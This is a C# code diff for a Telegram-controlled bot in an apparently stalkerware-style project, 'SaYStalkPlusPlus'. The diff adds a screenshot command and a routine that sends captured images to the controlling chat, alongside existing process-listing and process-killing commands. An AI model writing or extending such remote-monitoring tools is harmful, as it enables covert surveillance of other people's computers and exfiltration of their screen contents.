@@ -18,9 +18,11 @@ namespace SaYStalkPlusPlus.src
             { "activeProcesses", GetActiveProcesses.Execute},
             { "killProcess", KillProcess.Execute},
             { "killSSPP", KillSaYStalkPlusPlus.Execute},
+            { "takeScreen", TakeScreen.Execute },
             {"commands", ShowAllCommands },
 
         };
+        const int MaxMessageLength = 4096;
         public Bot(string tokenString)
         {
             _token = tokenString;
@@ -45,7 +47,7 @@ namespace SaYStalkPlusPlus.src
         private void StopBot() { _cancellationToken.Cancel(); }
         private static async Task SendMessage(ITelegramBotClient botClient, long chatId, string messageText)
         {
-            const int MaxMessageLength = 4096;
+
 
             if (messageText.Length <= MaxMessageLength)
                 await botClient.SendTextMessageAsync(chatId, messageText);
@@ -58,6 +60,15 @@ namespace SaYStalkPlusPlus.src
                 }
             }
         }
+        private static async Task SendPhoto(ITelegramBotClient botClient, long chatId, string filePath)
+        {
+            using (var stream = new FileStream(filePath, FileMode.Open))
+            {
+                var fileToSend = new Telegram.Bot.Types.InputFileStream(stream);
+                await botClient.SendPhotoAsync(chatId, fileToSend);
+            }
+
+        }
 
         private static async Task SendUnknownCommandMessage(ITelegramBotClient botClient, long chatId, string unknownCommand)
         {
@@ -68,10 +79,8 @@ namespace SaYStalkPlusPlus.src
         }
         private static async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
         {
-            if (update.Message is not { } message)
-                return;
-            if (message.Text is not { } messageText)
-                return;
+            if (update.Message is not { } message) return;
+            if (message.Text is not { } messageText) return;
 
             long chatId = message.Chat.Id;
 
@@ -103,13 +112,36 @@ namespace SaYStalkPlusPlus.src
             {
                 string?[] args = commandText.Split(" ")[1..];
                 CommandResult result = executableCommand(args);
-                string messageText = result.Success ? result.ResultString : result.ErrorString;
-                if (!string.IsNullOrEmpty(messageText))
-                    await SendMessage(botClient, chatId, messageText);
+                if (result is null)   return;
+
+                switch(result.Type)
+                {
+                    case CommandResultType.Text:
+                        {
+                            string messageText = result.Success ? result.ResultString : result.ErrorString;
+                            if (!string.IsNullOrEmpty(messageText))
+                                await SendMessage(botClient, chatId, messageText);
+                            break;
+                        }
+                    case CommandResultType.Photo:
+                        {
+                            if(!result.Success)
+                            {
+                                string errorText= result.ErrorString;
+                                await SendMessage(botClient, chatId, errorText);
+                                return;
+                            }
+                            await SendPhoto(botClient, chatId, result.ResultString);
+                            break;
+                        }
+                    default: return;
+                }
+
+               
             }
             else
             {
-                SendUnknownCommandMessage(botClient, chatId, command);
+                await SendUnknownCommandMessage(botClient, chatId, command);
                 return;
             }
 
